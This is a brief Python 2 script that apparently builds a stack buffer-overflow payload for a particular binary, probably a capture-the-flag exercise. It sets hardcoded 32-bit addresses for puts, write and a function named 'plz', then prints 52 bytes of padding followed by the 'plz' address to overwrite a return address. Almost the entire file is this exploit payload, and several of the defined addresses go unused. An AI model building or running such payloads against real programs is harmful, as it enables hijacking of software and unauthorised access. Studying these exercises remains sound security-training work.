#! /usr/bin/python

ebp = '\xb8\xd5\xff\xff'
puts_addr = '\x37\x86\x04\x08'      # call puts
plz_addr = '\xa6\x86\x04\x08'       # plz ...
write_addr = '\xb0\x84\x04\x08'     # write 
one = '\x01\x00\x00\x00'


print "G" * 52 + plz_addr

